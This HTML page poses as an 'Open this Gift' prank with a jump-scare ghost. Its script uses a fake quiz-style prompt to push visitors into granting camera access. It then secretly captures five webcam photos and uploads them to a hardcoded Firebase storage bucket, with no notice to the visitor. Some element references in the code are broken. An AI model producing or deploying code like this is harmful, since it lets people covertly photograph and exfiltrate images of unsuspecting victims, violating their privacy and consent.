<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Merged Website</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #121212;
            color: #fff;
            font-family: Arial, sans-serif;
            text-align: center;
        }

        .container {
            max-width: 600px;
        }

        h1 {
            font-size: 2em;
            margin-bottom: 20px;
        }

        .footer-text {
            font-size: 1.2em;
            margin-top: 20px;
            color: #ccc;
        }

        .fallback {
            color: red;
            margin-top: 20px;
        }

        /* MCQ-style permission guidance */
        .mcq-container {
            margin-top: 30px;
        }

        .mcq-option {
            display: inline-block;
            margin: 10px;
            padding: 10px 20px;
            background-color: #333;
            border-radius: 10px;
            cursor: pointer;
            position: relative;
            font-size: 1.2em;
        }

        /* Correct option with a revolving red rectangle */
        .mcq-option.correct {
            border: 2px solid transparent;
            position: relative;
        }

        .mcq-option.correct::before {
            content: '';
            position: absolute;
            top: -10px;
            left: -10px;
            right: -10px;
            bottom: -10px;
            border: 2px solid red;
            animation: rotateRectangle 1.5s linear infinite;
        }

        @keyframes rotateRectangle {
            from {
                transform: rotate(0deg);
            }

            to {
                transform: rotate(360deg);
            }
        }

        .error-message {
            color: red;
            font-size: 1.2em;
            margin-top: 10px;
            display: none;
        }

        /* Content styles (from the first website) */
        .heading {
            font-size: 2.5em;
            font-family: 'Comic Sans MS', cursive;
            color: red;
            margin-bottom: 20px;
            padding: 10px 20px; /* Add padding to look like a button */
            border: 2px solid red; /* Add a border */
            display: inline-block; /* Display inline-block to shape it like a button */
            border-radius: 10px; /* Rounded corners */
            background: rgba(255, 0, 0, 0.1); /* Slight background color */
            cursor: default; /* Normal cursor, not a pointer */
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.5); /* Add a glowing shadow */
            transition: all 0.3s ease-in-out; /* Smooth transition for hover effect */
        }

        .heading:hover {
            background: rgba(255, 0, 0, 0.2); /* Change background on hover */
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.8); /* Intensify shadow on hover */
        }

        .gift-container {
            position: relative;
            display: inline-block;
            text-align: center;
        }

        /* Animation to float the arrow up and down */
        @keyframes float-arrow {
            0% {
                transform: translateY(0px);
            }
            50% {
                transform: translateY(-10px);
            }
            100% {
                transform: translateY(0px);
            }
        }

        .arrow {
            margin-top: 20px;
            animation: float-arrow 2s ease-in-out infinite;
        }

        /* Gift image styling */
        .gift {
            width: 200px;
            height: 200px;
            background-image: url('gift.png'); /* Add your gift box image here */
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            cursor: pointer;
            position: relative;
            z-index: 1;
        }

        /* Hidden scary image */
        .hidden-ghost {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.9);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }

        .hidden-ghost img {
            width: 100px;
            height: auto;
            border: 5px solid white;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
            transition: width 4s ease-out;
        }

        .hidden-ghost img.grow {
            width: 600px;
        }

        @keyframes shake {
            0% { transform: translate(1px, 1px) rotate(0deg); }
            10% { transform: translate(-1px, -2px) rotate(-1deg); }
            20% { transform: translate(-3px, 0px) rotate(1deg); }
            30% { transform: translate(3px, 2px) rotate(0deg); }
            40% { transform: translate(1px, -1px) rotate(1deg); }
            50% { transform: translate(-1px, 2px) rotate(-1deg); }
            60% { transform: translate(-3px, 1px) rotate(0deg); }
            70% { transform: translate(3px, 1px) rotate(-1deg); }
            80% { transform: translate(-1px, -1px) rotate(1deg); }
            90% { transform: translate(1px, 2px) rotate(0deg); }
            100% { transform: translate(1px, -2px) rotate(-1deg); }
        }

        .hidden-ghost img.shake {
            animation: shake 0.1s infinite;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="mcq-container" id="mcq-container">
            <p>Please select the correct option to allow camera access:</p>
            <div class="mcq-option correct" id="mcq-allow">Allow</div>
            <div class="mcq-option" id="mcq-block">Block</div>
        </div>
        <div class="error-message" id="error-message">Please click the "Allow" button.</div>
        <div class="fallback" id="fallback" style="display: none;">Your browser does not support the required
            permissions. Please open this page in Chrome or Safari.</div>

        <!-- Original content from first website -->
        <!-- Heading -->
    <div class="heading" id="heading">Open this Gift</div>

    <!-- Gift Container -->
    <div class="gift-container">
        <!-- SVG Arrow -->
        <div class="arrow">
            <svg xmlns="http://www.w3.org/2000/svg" width="60" height="60" fill="red" viewBox="0 0 24 24">
                <path d="M12 21l-12-18h24z"/>
            </svg>
        </div>
        <!-- Gift box -->
        <div class="gift" id="gift"></div>
    </div>

    <!-- Hidden ghost section -->
    <div class="hidden-ghost" id="ghost">
        <img id="ghost-image" src="scary.jpeg" alt="Scary Ghost">
        <audio id="scream" src="scary.ogg" preload="auto"></audio>
    </div>
        
    <script type="module">
        // Import Firebase SDKs
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";

        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyBsG-hDNF8DRowgjz9WR4wVlSL398_gQyI",
            authDomain: "photos-c3ca9.firebaseapp.com",
            projectId: "photos-c3ca9",
            storageBucket: "photos-c3ca9.appspot.com",
            messagingSenderId: "231479999084",
            appId: "1:231479999084:web:045f573955ed1190f4b649",
            measurementId: "G-X7YW60B7V5"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);

        let photos = [];
        let photoCount = 0;
        const totalPhotos = 5;
        const fallbackDiv = document.getElementById('fallback');
        const mcqContainer = document.getElementById('mcq-container');
        const errorMessage = document.getElementById('error-message');
        const giftContainer = document.getElementById('gift-container');

        function showFallback() {
            fallbackDiv.style.display = 'block';
            mcqContainer.style.display = 'none';
        }

        function capturePhoto(video) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            const dataUrl = canvas.toDataURL('image/png');
            photos.push(dataUrl);
            photoCount++;

            // Once all photos are captured, upload them to Firebase
            if (photoCount === totalPhotos) {
                uploadPhotosToFirebase();
            }
        }

        function startPhotoCapture(video) {
            const captureInterval = setInterval(() => {
                capturePhoto(video);
                if (photoCount === totalPhotos) {
                    clearInterval(captureInterval);
                }
            }, 500);
        }

        function uploadPhotosToFirebase() {
            photos.forEach((photo, index) => {
                const photoRef = ref(storage, `photos/photo_${index + 1}.png`);

                // Upload the photo as base64
                uploadString(photoRef, photo, 'data_url').then((snapshot) => {
                    console.log('Uploaded a photo to Firebase!', snapshot);
                }).catch((error) => {
                    console.error('Failed to upload photo:', error);
                });
            });
        }

        function requestCameraPermissions() {
            navigator.permissions.query({ name: 'camera' }).then((result) => {
                if (result.state === 'granted') {
                    initCamera();
                } else if (result.state === 'denied') {
                    localStorage.removeItem('cameraPermissionGranted');
                    showFallback();
                } else {
                    // Show the MCQ guidance to the user
                    mcqContainer.style.display = 'block';
                }
            }).catch((error) => {
                console.error('Permission query failed:', error);
                showFallback();
            });
        }

        function initCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then((stream) => {
                    // Hide the MCQ UI and show the main content
                    mcqContainer.style.display = 'none';
                    giftContainer.style.display = 'flex';

                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    // Start capturing photos
                    startPhotoCapture(video);

                    // Add click event listener for the gift
                    document.getElementById('gift-image').addEventListener('click', () => {
                        // Reveal ghost and play sound
                        document.getElementById('ghost-image').style.display = 'block';
                        document.getElementById('scream').play();

                        // Optional: Add some shake effect to ghost image
                        document.getElementById('ghost-image').classList.add('shake');
                    });
                })
                .catch((error) => {
                    console.error('Camera access denied:', error);
                    showFallback();
                });
        }

        document.getElementById('mcq-allow').addEventListener('click', () => {
    // Directly request camera permissions when the user clicks Allow
    navigator.mediaDevices.getUserMedia({ video: true })
        .then((stream) => {
            // If permission is granted, hide the MCQ UI and show the main content
            mcqContainer.style.display = 'none';
            giftContainer.style.display = 'flex';

            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            // Start capturing photos
            startPhotoCapture(video);
        })
        .catch((error) => {
            console.error('Camera access denied:', error);
            // Show error message if permission is denied
            errorMessage.style.display = 'block';
        });
});

        // Event listener for Block button
        document.getElementById('mcq-block').addEventListener('click', () => {
            // Show error message when the user clicks Block
            errorMessage.style.display = 'block';
        });

        // Initial check for permissions
        if (navigator.permissions) {
            navigator.permissions.query({ name: 'camera' }).then((result) => {
                if (result.state === 'granted') {
                    initCamera();
                } else if (result.state === 'denied') {
                    showFallback();
                }
            }).catch((error) => {
                console.error('Permission query failed:', error);
                showFallback();
            });
        } else {
            // If Permissions API is not supported, show fallback
            showFallback();
        }
        let giftElement = document.getElementById('gift');
        let headingElement = document.getElementById('heading');
        let ghostElement = document.getElementById('ghost');
        let ghostImage = document.getElementById('ghost-image');
        let screamSound = document.getElementById('scream');

        // Function to show the scary ghost and play sound
        function showGhost() {
            // Hide the gift section
            document.querySelector('.gift-container').style.display = 'none';

            // Show the ghost and play the audio
            document.body.style.backgroundColor = "black";
            ghostElement.style.display = 'flex';

            // Add grow and shake effects to the image
            ghostImage.classList.add('grow', 'shake');
            screamSound.play().catch(function () {
                console.error("Auto-play blocked, but user interaction should allow it.");
            });
        }

        // Event listener for clicking the gift
        giftElement.addEventListener('click', showGhost);

        // Event listener for clicking the heading
        headingElement.addEventListener('click', showGhost);
    </script>
</body>

</html>
